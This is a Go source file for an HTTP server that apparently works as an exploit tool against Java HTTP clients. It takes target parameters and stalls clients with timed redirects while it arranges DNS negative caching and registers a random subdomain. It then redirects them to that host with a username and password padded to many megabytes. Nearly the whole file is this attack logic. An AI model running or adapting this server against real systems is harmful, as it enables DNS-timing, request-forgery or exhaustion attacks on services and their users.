package main

import (
	"context"
	"fmt"
	"math"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

const (
	MaxSleepDuration time.Duration = time.Second * 15
	SessionIdLength  int           = 32
)

type ServerHandler struct {
	context      context.Context
	taskManager  *TaskManager
	sessionStore SessionStore
}

func NewServerHandler(ctx context.Context, config XCConfig) *ServerHandler {
	return &ServerHandler{
		context:      ctx,
		taskManager:  NewTaskManager(ctx, config),
		sessionStore: NewInMemorySessionStore(),
	}
}

func (s *ServerHandler) HandleNewSession(writer http.ResponseWriter, request *http.Request) error {
	getQuery := func(key string, def string) string {
		q := request.URL.Query().Get(key)
		if q == "" {
			return def
		}
		return q
	}

	targetPort, err := strconv.Atoi(getQuery("targetPort", "80"))
	if err != nil || targetPort > math.MaxUint16 {
		return NewBadRequest("invalid targetPort")
	}

	targetUrl, err := url.Parse(getQuery("targetUrl", ""))
	if err != nil {
		return NewBadRequest("invalid targetUrl url")
	}

	targetScheme := Scheme(getQuery("targetScheme", "http"))
	if targetScheme != SchemeHttp && targetScheme != SchemeHttps {
		return NewBadRequest("invalid targetScheme")
	}

	payloadSize, err := strconv.ParseUint(getQuery("payloadSize", "25"), 10, 64)
	payloadSize = payloadSize * MB
	if err != nil || payloadSize > MaxPayloadSize {
		return NewBadRequest("invalid payload size")
	}

	sleepDurationInt, err := strconv.Atoi(getQuery("sleepDuration", "7000"))
	sleepDuration := time.Duration(sleepDurationInt) * time.Millisecond
	if err != nil || sleepDuration > MaxSleepDuration || sleepDuration < 0 {
		return NewBadRequest("invalid sleepDuration")
	}

	sessionId := GenerateRandomName(SessionIdLength)
	dnsSdName := GenerateRandomName(DnsSubdomainLength)

	session := &Session{
		id:            sessionId,
		dnsSdName:     dnsSdName,
		payloadSize:   payloadSize,
		sleepDuration: sleepDuration,
		targetUrl:     targetUrl,
		targetPort:    uint16(targetPort),
		targetScheme:  targetScheme,
		negCacheRes:   nil,
		dnsRegRes:     nil,
		startTime:     nil,
	}

	if err := s.sessionStore.Set(sessionId, session); err != nil {
		return NewInternalError("cannot set session in session store", err)
	}

	s.taskManager.Submit(session)
	return s.absoluteRedirectTo(writer, request, "redirect?session="+sessionId, 302)
}

func (s *ServerHandler) HandleRedirect(writer http.ResponseWriter, request *http.Request) error {
	requestTime := time.Now()
	if ua := request.Header.Get("User-Agent"); strings.Index(ua, "Java") != 0 {
		Logger.Debug("ignoring request from ", ua)
		writer.WriteHeader(http.StatusOK)
		return nil
	}

	sessionId := request.URL.Query().Get("session")
	if len(sessionId) != SessionIdLength {
		return NewBadRequest("invalid session id")
	}

	session, err := s.sessionStore.Get(sessionId)
	if err != nil {
		return NewBadRequest("session not registered")
	}

	sleepAndComeback := func(maxDuration time.Duration) error {
		elapsed := time.Now().Sub(requestTime)
		toSleep := MaxResponseTime - elapsed
		if maxDuration > 0 && toSleep > maxDuration {
			toSleep = maxDuration
		}

		if toSleep > 0 {
			Logger.Info("sleeping and returning after ", toSleep.String())
			time.Sleep(toSleep)
		}

		return s.absoluteRedirectTo(writer, request, "redirect?session="+sessionId, 302)
	}

	if session.negCacheRes == nil {
		return sleepAndComeback(0)
	}

	if session.negCacheRes.err != nil {
		return NewInternalError("cannot trigger negative cache", session.negCacheRes.err)
	}

	startTime := session.negCacheRes.time

	if session.dnsRegRes != nil && session.dnsRegRes.err != nil {
		return NewInternalError("cannot register dns subdomain", session.dnsRegRes.err)
	}

	diff := session.sleepDuration - time.Now().Sub(startTime)
	if diff > time.Millisecond*250 {
		return sleepAndComeback(diff)
	}

	if session.dnsRegRes == nil || session.dnsRegRes.err != nil {
		return NewInternalError("cannot register dns subdomain in time", nil)
	}

	payloadSize := session.payloadSize
	port := session.targetPort
	scheme := session.targetScheme
	path := session.targetUrl
	host := BuildDnsHost(session.dnsSdName)
	username := strings.Repeat("u", int(payloadSize/2))
	password := strings.Repeat("p", int(payloadSize)-len(username))

	format := fmt.Sprintf("%s://u{%d}:p{%d}@%s:%d/%s",
		session.targetScheme, len(username), len(password), host, port, path.String())
	Logger.Info("final redirect to ", format)

	http.Redirect(writer, request, string(scheme)+"://"+username+":"+password+"@"+host+
		":"+strconv.Itoa(int(port))+"/"+path.String(), 302)

	return nil
}

func (s *ServerHandler) absoluteRedirectTo(w http.ResponseWriter, r *http.Request, path string, code int) error {
	http.Redirect(w, r, "http://"+r.Host+"/"+path, code)
	return nil
}
